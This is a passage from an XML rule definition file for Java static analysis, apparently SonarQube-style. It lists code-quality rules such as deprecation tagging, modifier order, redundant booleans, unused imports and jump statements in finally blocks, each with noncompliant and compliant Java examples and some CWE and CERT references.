            BufferedReader br = new BufferedReader(/* ... */);
            String line;
            while ((line = br.readLine()) != null) {...}
            &lt;/pre&gt;
            &lt;p&gt;Chained assignments, including compound assignments, are ignored.&lt;/p&gt;
            &lt;pre&gt;
            int i = j = 0;
            int k = (j += 1);
            result = (bresult = new byte[len]);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/481.html&quot;&gt;MITRE, CWE-481&lt;/a&gt;
            - Assigning instead of Comparing &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/ZNYxBQ&quot;&gt;CERT, EXP45-C.&lt;/a&gt; -
            Do not perform assignments in selection statements &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/ITZGBQ&quot;&gt;CERT, EXP51-J.&lt;/a&gt; -
            Do not perform assignments in conditional expressions &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>suspicious</tag>
    </rule>

    <rule key='S1123' priority='MAJOR'>
        <configKey>S1123</configKey>
        <name>Deprecated elements should have both the annotation and the Javadoc tag</name>
        <description>
            &lt;p&gt;Deprecation should be marked with both the &lt;code&gt;@Deprecated&lt;/code&gt; annotation and
            @deprecated Javadoc tag. The annotation enables tools such as
            IDEs to warn about referencing deprecated elements, and the tag can be used to explain when it was
            deprecated, why, and how references should be
            refactored. &lt;/p&gt;
            &lt;p&gt;Further, Java 9 adds two additional arguments to the annotation:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;since&lt;/code&gt; allows you to describe when the deprecation took place &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;forRemoval&lt;/code&gt;, indicates whether the deprecated element will be removed at
            some future date &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;If your compile level is Java 9 or higher, you should be using one or both of these arguments.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {

            @Deprecated
            public void foo1() {
            }

            /**
            * @deprecated
            */
            public void foo2() { // Noncompliant
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {

            /**
            * @deprecated (when, why, refactoring advice...)
            */
            @Deprecated
            public void foo1() {
            }

            /**
            * Java &amp;gt;= 9
            * @deprecated (when, why, refactoring advice...)
            */
            @Deprecated(since=&quot;5.1&quot;)
            public void foo2() {
            }

            /**
            * Java &amp;gt;= 9
            * @deprecated (when, why, refactoring advice...)
            */
            @Deprecated(since=&quot;4.2&quot;, forRemoval=true)
            public void foo3() {
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;The members and methods of a deprecated class or interface are ignored by this rule. The classes
            and interfaces themselves are still subject to
            it.&lt;/p&gt;
            &lt;pre&gt;
            /**
            * @deprecated (when, why, etc...)
            */
            @Deprecated
            class Qix {

            public void foo() {} // Compliant; class is deprecated

            }

            /**
            * @deprecated (when, why, etc...)
            */
            @Deprecated
            interface Plop {

            void bar();

            }
            &lt;/pre&gt;
        </description>
        <tag>bad-practice</tag>
        <tag>obsolete</tag>
    </rule>

    <rule key='S1124' priority='MINOR'>
        <configKey>S1124</configKey>
        <name>Modifiers should be declared in the correct order</name>
        <description>
            &lt;p&gt;The Java Language Specification recommends listing modifiers in the following order:&lt;/p&gt;
            &lt;ol&gt;
            &lt;li&gt; Annotations &lt;/li&gt;
            &lt;li&gt; public &lt;/li&gt;
            &lt;li&gt; protected &lt;/li&gt;
            &lt;li&gt; private &lt;/li&gt;
            &lt;li&gt; abstract &lt;/li&gt;
            &lt;li&gt; static &lt;/li&gt;
            &lt;li&gt; final &lt;/li&gt;
            &lt;li&gt; transient &lt;/li&gt;
            &lt;li&gt; volatile &lt;/li&gt;
            &lt;li&gt; synchronized &lt;/li&gt;
            &lt;li&gt; native &lt;/li&gt;
            &lt;li&gt; strictfp &lt;/li&gt;
            &lt;/ol&gt;
            &lt;p&gt;Not following this convention has no technical impact, but will reduce the code's readability
            because most developers are used to the standard
            order.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            static public void main(String[] args) { // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public static void main(String[] args) { // Compliant
            }
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
    </rule>

    <rule key='S1125' priority='MINOR'>
        <configKey>S1125</configKey>
        <name>Boolean literals should not be redundant</name>
        <description>
            &lt;p&gt;Redundant Boolean literals should be removed from expressions to improve readability.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (booleanMethod() == true) { /* ... */ }
            if (booleanMethod() == false) { /* ... */ }
            if (booleanMethod() || false) { /* ... */ }
            doSomething(!false);
            doSomething(booleanMethod() == true);

            booleanVariable = booleanMethod() ? true : false;
            booleanVariable = booleanMethod() ? true : exp;
            booleanVariable = booleanMethod() ? false : exp;
            booleanVariable = booleanMethod() ? exp : true;
            booleanVariable = booleanMethod() ? exp : false;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (booleanMethod()) { /* ... */ }
            if (!booleanMethod()) { /* ... */ }
            if (booleanMethod()) { /* ... */ }
            doSomething(true);
            doSomething(booleanMethod());

            booleanVariable = booleanMethod();
            booleanVariable = booleanMethod() || exp;
            booleanVariable = !booleanMethod() &amp;amp;&amp;amp; exp;
            booleanVariable = !booleanMethod() || exp;
            booleanVariable = booleanMethod() &amp;amp;&amp;amp; exp;
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S1126' priority='MINOR'>
        <configKey>S1126</configKey>
        <name>Return of boolean expressions should not be wrapped into an &quot;if-then-else&quot; statement</name>
        <description>
            &lt;p&gt;Return of boolean literal statements wrapped into &lt;code&gt;if-then-else&lt;/code&gt; ones should
            be simplified.&lt;/p&gt;
            &lt;p&gt;Similarly, method invocations wrapped into &lt;code&gt;if-then-else&lt;/code&gt; differing only
            from boolean literals should be simplified into a single
            invocation.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            boolean foo(Object param) {
            if (expression) { // Noncompliant
            bar(param, true, &quot;qix&quot;);
            } else {
            bar(param, false, &quot;qix&quot;);
            }

            if (expression) { // Noncompliant
            return true;
            } else {
            return false;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            boolean foo(Object param) {
            bar(param, expression, &quot;qix&quot;);

            return expression;
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S1128' priority='MINOR'>
        <configKey>S1128</configKey>
        <name>Unnecessary imports should be removed</name>
        <description>
            &lt;p&gt;The imports part of a file should be handled by the Integrated Development Environment (IDE), not
            manually by the developer. &lt;/p&gt;
            &lt;p&gt;Unused and useless imports should not occur if that is the case. &lt;/p&gt;
            &lt;p&gt;Leaving them in reduces the code's readability, since their presence can be confusing.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            package my.company;

            import java.lang.String; // Noncompliant; java.lang classes are always implicitly imported
            import my.company.SomeClass; // Noncompliant; same-package files are always implicitly imported
            import java.io.File; // Noncompliant; File is not used

            import my.company2.SomeType;
            import my.company2.SomeType; // Noncompliant; 'SomeType' is already imported

            class ExampleClass {

            public String someString;
            public SomeType something;

            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Imports for types mentioned in comments, such as Javadocs, are ignored.&lt;/p&gt;
        </description>
        <tag>unused</tag>
    </rule>

    <rule key='S1130' priority='MINOR'>
        <configKey>S1130</configKey>
        <name>&quot;throws&quot; declarations should not be superfluous</name>
        <description>
            &lt;p&gt;An exception in a &lt;code&gt;throws&lt;/code&gt; declaration in Java is superfluous if it is:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; listed multiple times &lt;/li&gt;
            &lt;li&gt; a subclass of another listed exception &lt;/li&gt;
            &lt;li&gt; completely unnecessary because the declared exception type cannot actually be thrown &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            void foo() throws MyException, MyException {} // Noncompliant; should be listed once
            void bar() throws Throwable, Exception {} // Noncompliant; Exception is a subclass of Throwable
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            void foo() throws MyException {}
            void bar() throws Throwable {}
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;The rule will not raise any issue for exceptions that cannot be thrown from the method body:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; in overriding and implementation methods &lt;/li&gt;
            &lt;li&gt; in interface &lt;code&gt;default&lt;/code&gt; methods &lt;/li&gt;
            &lt;li&gt; in non-private methods that only &lt;code&gt;throw&lt;/code&gt;, have empty bodies, or a single
            return statement. &lt;/li&gt;
            &lt;li&gt; in overridable methods (non-final, or not member of a final class, non-static, non-private), if
            the exception is documented with a proper
            JavaDoc &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Also, the rule won't raise issues on &lt;code&gt;RuntimeException&lt;/code&gt;, or one of its
            descendants, because explicating runtime exceptions which could
            be thrown can ultimately help the method's users, and can even be considered as good practice.&lt;/p&gt;
            &lt;pre&gt;
            class A extends B {
            @Override
            void doSomething() throws IOException {
            compute(a);
            }

            public void foo() throws IOException {}

            public void qix() throws MyRuntimeException {}

            protected void bar() throws IOException {
            throw new UnsupportedOperationException(&quot;This method should be implemented in subclasses&quot;);
            }

            Object foobar(String s) throws IOException {
            return null;
            }

            /**
            * @throws IOException Overriding classes may throw this exception if they print values into a file
            */
            protected void print() throws IOException { // no issue, method is overridable and the exception has proper
            javadoc
            System.out.println(&quot;foo&quot;);
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
        <tag>error-handling</tag>
        <tag>redundant</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S1133' priority='INFO'>
        <configKey>S1133</configKey>
        <name>Deprecated code should be removed</name>
        <description>
            &lt;p&gt;This rule is meant to be used as a way to track code which is marked as being deprecated.
            Deprecated code should eventually be removed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class Foo {
            /**
            * @deprecated
            */
            public void foo() { // Noncompliant
            }

            @Deprecated // Noncompliant
            public void bar() {
            }

            public void baz() { // Compliant
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>obsolete</tag>
    </rule>

    <rule key='S1134' priority='MAJOR'>
        <configKey>S1134</configKey>
        <name>Track uses of &quot;FIXME&quot; tags</name>
        <description>
            &lt;p&gt;&lt;code&gt;FIXME&lt;/code&gt; tags are commonly used to mark places where a bug is suspected, but
            which the developer wants to deal with later.&lt;/p&gt;
            &lt;p&gt;Sometimes the developer will not have the time or will simply forget to get back to that tag.&lt;/p&gt;
            &lt;p&gt;This rule is meant to track those tags and to ensure that they do not go unnoticed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int divide(int numerator, int denominator) {
            return numerator / denominator; // FIXME denominator value might be 0
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/546.html&quot;&gt;MITRE, CWE-546&lt;/a&gt;
            - Suspicious Comment &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
    </rule>

    <rule key='S1135' priority='INFO'>
        <configKey>S1135</configKey>
        <name>Track uses of &quot;TODO&quot; tags</name>
        <description>
            &lt;p&gt;&lt;code&gt;TODO&lt;/code&gt; tags are commonly used to mark places where some more code is
            required, but which the developer wants to implement later.&lt;/p&gt;
            &lt;p&gt;Sometimes the developer will not have the time or will simply forget to get back to that tag.&lt;/p&gt;
            &lt;p&gt;This rule is meant to track those tags and to ensure that they do not go unnoticed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            void doSomething() {
            // TODO
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/546.html&quot;&gt;MITRE, CWE-546&lt;/a&gt;
            - Suspicious Comment &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
    </rule>

    <rule key='S114' priority='MINOR'>
        <configKey>S114</configKey>
        <name>Interface names should comply with a naming convention</name>
        <description>
            &lt;p&gt;Sharing some naming conventions is a key point to make it possible for a team to efficiently
            collaborate. This rule allows to check that all
            interface names match a provided regular expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With the default regular expression &lt;code&gt;^[A-Z][a-zA-Z0-9]*$&lt;/code&gt;:&lt;/p&gt;
            &lt;pre&gt;
            public interface myInterface {...} // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public interface MyInterface {...}
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <param>
            <key>format</key>
            <description>Regular expression used to check the interface names against.</description>
            <defaultValue>^[A-Z][a-zA-Z0-9]*$</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S1141' priority='MAJOR'>
        <configKey>S1141</configKey>
        <name>Try-catch blocks should not be nested</name>
        <description>
            &lt;p&gt;Nesting &lt;code&gt;try&lt;/code&gt;/&lt;code&gt;catch&lt;/code&gt; blocks severely impacts the
            readability of source code because it makes it too difficult to understand
            which block will catch which exception.&lt;/p&gt;
        </description>
        <tag>confusing</tag>
        <tag>error-handling</tag>
    </rule>

    <rule key='S1143' priority='CRITICAL'>
        <configKey>S1143</configKey>
        <name>Jump statements should not occur in &quot;finally&quot; blocks</name>
        <description>
            &lt;p&gt;Using &lt;code&gt;return&lt;/code&gt;, &lt;code&gt;break&lt;/code&gt;, &lt;code&gt;throw&lt;/code&gt;,
            and so on from a &lt;code&gt;finally&lt;/code&gt; block suppresses the propagation of any
            unhandled &lt;code&gt;Throwable&lt;/code&gt; which was thrown in the &lt;code&gt;try&lt;/code&gt; or &lt;code&gt;catch&lt;/code&gt;
            block.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a jump statement (&lt;code&gt;break&lt;/code&gt;, &lt;code&gt;continue&lt;/code&gt;,
            &lt;code&gt;return&lt;/code&gt;, &lt;code&gt;throw&lt;/code&gt;, and
            &lt;code&gt;goto&lt;/code&gt;) would force control flow to leave a &lt;code&gt;finally&lt;/code&gt; block.
            &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public static void main(String[] args) {
            try {
            doSomethingWhichThrowsException();
            System.out.println(&quot;OK&quot;); // incorrect &quot;OK&quot; message is printed
            } catch (RuntimeException e) {
            System.out.println(&quot;ERROR&quot;); // this message is not shown
            }
            }

            public static void doSomethingWhichThrowsException() {
            try {
            throw new RuntimeException();
            } finally {
            for (int i = 0; i &amp;lt; 10; i ++) {
            //...
            if (q == i) {
            break; // ignored
            }
            }

            /* ... */
            return; // Noncompliant - prevents the RuntimeException from being propagated
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public static void main(String[] args) {
            try {
            doSomethingWhichThrowsException();
            System.out.println(&quot;OK&quot;);
            } catch (RuntimeException e) {
            System.out.println(&quot;ERROR&quot;); // &quot;ERROR&quot; is printed as expected
            }
            }

            public static void doSomethingWhichThrowsException() {
            try {
            throw new RuntimeException();
            } finally {
            for (int i = 0; i &amp;lt; 10; i ++) {
            //...
            if (q == i) {
            break; // ignored
            }
            }

            /* ... */
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/584.html&quot;&gt;MITRE, CWE-584&lt;/a&gt;
            - Return Inside Finally Block &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/BTdGBQ&quot;&gt;CERT, ERR04-J.&lt;/a&gt; -
            Do not complete abruptly from a finally block &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>error-handling</tag>
    </rule>

    <rule key='S1144' priority='MAJOR'>
        <configKey>S1144</configKey>
        <name>Unused &quot;private&quot; methods should be removed</name>
        <description>
            &lt;p&gt;&lt;code&gt;private&lt;/code&gt; methods that are never executed are dead code: unnecessary,
            inoperative code that should be removed. Cleaning out dead code
            decreases the size of the maintained codebase, making it easier to understand the program and preventing
            bugs from being introduced.&lt;/p&gt;
            &lt;p&gt;Note that this rule does not take reflection into account, which means that issues will be raised
            on &lt;code&gt;private&lt;/code&gt; methods that are only
            accessed using the reflection API.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo implements Serializable
            {
            private Foo(){} //Compliant, private empty constructor intentionally used to prevent any direct
            instantiation of a class.
            public static void doSomething(){
            Foo foo = new Foo();
            ...
            }
            private void unusedPrivateMethod(){...}
            private void writeObject(ObjectOutputStream s){...} //Compliant, relates to the java serialization mechanism
            private void readObject(ObjectInputStream in){...} //Compliant, relates to the java serialization mechanism
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo implements Serializable
            {
            private Foo(){} //Compliant, private empty constructor intentionally used to prevent any direct
            instantiation of a class.
            public static void doSomething(){
            Foo foo = new Foo();
            ...
            }

            private void writeObject(ObjectOutputStream s){...} //Compliant, relates to the java serialization mechanism

            private void readObject(ObjectInputStream in){...} //Compliant, relates to the java serialization mechanism
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule doesn't raise any issue on annotated methods.&lt;/p&gt;
        </description>
        <tag>unused</tag>
    </rule>

    <rule key='S1149' priority='MAJOR'>
        <configKey>S1149</configKey>
        <name>Synchronized classes Vector, Hashtable, Stack and StringBuffer should not be used</name>
        <description>
            &lt;p&gt;Early classes of the Java API, such as &lt;code&gt;Vector&lt;/code&gt;, &lt;code&gt;Hashtable&lt;/code&gt;
            and &lt;code&gt;StringBuffer&lt;/code&gt;, were synchronized to make them
            thread-safe. Unfortunately, synchronization has a big negative impact on performance, even when using these
            collections from a single thread.&lt;/p&gt;
            &lt;p&gt;It is better to use their new unsynchronized replacements:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;ArrayList&lt;/code&gt; or &lt;code&gt;LinkedList&lt;/code&gt; instead of &lt;code&gt;Vector&lt;/code&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Deque&lt;/code&gt; instead of &lt;code&gt;Stack&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;HashMap&lt;/code&gt; instead of &lt;code&gt;Hashtable&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;StringBuilder&lt;/code&gt; instead of &lt;code&gt;StringBuffer&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Even when used in synchronized context, you should think twice before using it, since it's usage
            can be tricky. If you are confident the usage is
            legitimate, you can safely ignore this warning.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Vector cats = new Vector();
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            ArrayList cats = new ArrayList();
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Use of those synchronized classes is ignored in the signatures of overriding methods.&lt;/p&gt;
            &lt;pre&gt;
            @Override
            public Vector getCats() {...}
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S115' priority='CRITICAL'>
        <configKey>S115</configKey>
        <name>Constant names should comply with a naming convention</name>
        <description>
            &lt;p&gt;Shared coding conventions allow teams to collaborate efficiently. This rule checks that all
            constant names match a provided regular expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With the default regular expression &lt;code&gt;^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$&lt;/code&gt;:&lt;/p&gt;
            &lt;pre&gt;
            public class MyClass {
            public static final int first = 1;
            }

            public enum MyEnum {
            first;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            public static final int FIRST = 1;
            }

            public enum MyEnum {
            FIRST;
            }
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <param>
            <key>format</key>
            <description>Regular expression used to check the constant names against.</description>
            <defaultValue>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S1150' priority='MAJOR'>
        <configKey>S1150</configKey>
        <name>Enumeration should not be implemented</name>
        <description>
            &lt;p&gt;From the official Oracle Javadoc:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;NOTE: The functionality of this Enumeration interface is duplicated by the Iterator interface. In
            addition, Iterator adds an optional remove
            operation, and has shorter method names. New implementations should consider using Iterator in preference to
            Enumeration.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass implements Enumeration { // Non-Compliant
            /* ... */
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass implements Iterator { // Compliant
            /* ... */
            }
            &lt;/pre&gt;
        </description>
        <tag>obsolete</tag>
    </rule>

    <rule key='S1153' priority='MINOR'>
        <configKey>S1153</configKey>
        <name>String.valueOf() should not be appended to a String</name>
        <description>
            &lt;p&gt;Appending &lt;code&gt;String.valueOf()&lt;/code&gt; to a &lt;code&gt;String&lt;/code&gt; decreases
            the code readability.&lt;/p&gt;
            &lt;p&gt;The argument passed to &lt;code&gt;String.valueOf()&lt;/code&gt; should be directly appended
            instead.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void display(int i){
            System.out.println(&quot;Output is &quot; + String.valueOf(i)); // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void display(int i){
            System.out.println(&quot;Output is &quot; + i); // Compliant
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S1155' priority='MINOR'>
        <configKey>S1155</configKey>
        <name>Collection.isEmpty() should be used to test for emptiness</name>
        <description>
            &lt;p&gt;Using &lt;code&gt;Collection.size()&lt;/code&gt; to test for emptiness works, but using &lt;code&gt;Collection.isEmpty()&lt;/code&gt;
            makes the code more readable and can
            be more performant. The time complexity of any &lt;code&gt;isEmpty()&lt;/code&gt; method implementation
            should be &lt;code&gt;O(1)&lt;/code&gt; whereas some implementations
            of &lt;code&gt;size()&lt;/code&gt; can be &lt;code&gt;O(n)&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (myCollection.size() == 0) { // Noncompliant
            /* ... */
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (myCollection.isEmpty()) {
            /* ... */
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S1157' priority='MINOR'>
        <configKey>S1157</configKey>
        <name>Case insensitive string comparisons should be made without intermediate upper or lower casing</name>
        <description>
            &lt;p&gt;Using &lt;code&gt;toLowerCase()&lt;/code&gt; or &lt;code&gt;toUpperCase()&lt;/code&gt; to make case
            insensitive comparisons is inefficient because it requires the creation
            of temporary, intermediate &lt;code&gt;String&lt;/code&gt; objects.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            boolean result1 = foo.toUpperCase().equals(bar); // Noncompliant
            boolean result2 = foo.equals(bar.toUpperCase()); // Noncompliant
            boolean result3 = foo.toLowerCase().equals(bar.LowerCase()); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            boolean result = foo.equalsIgnoreCase(bar); // Compliant
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;No issue will be raised when a locale is specified because the result could be different from
            &quot;equalsIgnoreCase&quot;. (e.g.: using the Turkish
            locale)&lt;/p&gt;
            &lt;pre&gt;
            boolean result1 = foo.toUpperCase(locale).equals(bar); // Compliant
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S1158' priority='MINOR'>
        <configKey>S1158</configKey>
        <name>Primitive wrappers should not be instantiated only for &quot;toString&quot; or &quot;compareTo&quot;
            calls
        </name>
        <description>
            &lt;p&gt;Creating temporary primitive wrapper objects only for &lt;code&gt;String&lt;/code&gt; conversion or
            the use of the &lt;code&gt;compareTo&lt;/code&gt; method is
            inefficient.&lt;/p&gt;
            &lt;p&gt;Instead, the static &lt;code&gt;toString()&lt;/code&gt; or &lt;code&gt;compare&lt;/code&gt; method
            of the primitive wrapper class should be used.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            new Integer(myInteger).toString(); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Integer.toString(myInteger); // Compliant
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S116' priority='MINOR'>
        <configKey>S116</configKey>
        <name>Field names should comply with a naming convention</name>
        <description>
            &lt;p&gt;Sharing some naming conventions is a key point to make it possible for a team to efficiently
            collaborate. This rule allows to check that field
            names match a provided regular expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With the default regular expression &lt;code&gt;^[a-z][a-zA-Z0-9]*$&lt;/code&gt;:&lt;/p&gt;
            &lt;pre&gt;
            class MyClass {
            private int my_field;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {
            private int myField;
            }
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <param>
            <key>format</key>
            <description>Regular expression used to check the field names against.</description>
            <defaultValue>^[a-z][a-zA-Z0-9]*$</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S1161' priority='MAJOR'>
        <configKey>S1161</configKey>
        <name>&quot;@Override&quot; should be used on overriding and implementing methods</name>
        <description>
            &lt;p&gt;Using the &lt;code&gt;@Override&lt;/code&gt; annotation is useful for two reasons :&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; It elicits a warning from the compiler if the annotated method doesn't actually override
            anything, as in the case of a misspelling. &lt;/li&gt;
            &lt;li&gt; It improves the readability of the source code by making it obvious that methods are overridden.
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class ParentClass {
            public boolean doSomething(){...}
            }
            class FirstChildClass extends ParentClass {
            public boolean doSomething(){...} // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class ParentClass {
            public boolean doSomething(){...}
            }
            class FirstChildClass extends ParentClass {
            @Override
            public boolean doSomething(){...} // Compliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule is relaxed when overriding a method from the &lt;code&gt;Object&lt;/code&gt; class like
            &lt;code&gt;toString()&lt;/code&gt;, &lt;code&gt;hashCode()&lt;/code&gt;, ...&lt;/p&gt;
        </description>
        <tag>bad-practice</tag>
    </rule>

    <rule key='S1163' priority='CRITICAL'>
        <configKey>S1163</configKey>
        <name>Exceptions should not be thrown in finally blocks</name>
        <description>
            &lt;p&gt;Throwing an exception from within a finally block will mask any exception which was previously
            thrown in the &lt;code&gt;try&lt;/code&gt; or &lt;code&gt;catch&lt;/code&gt;
            block, and the masked's exception message and stack trace will be lost.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            try {
            /* some work which end up throwing an exception */
            throw new IllegalArgumentException();
            } finally {
            /* clean up */
            throw new RuntimeException(); // Noncompliant; masks the IllegalArgumentException
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            try {
            /* some work which end up throwing an exception */
            throw new IllegalArgumentException();
            } finally {
            /* clean up */
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
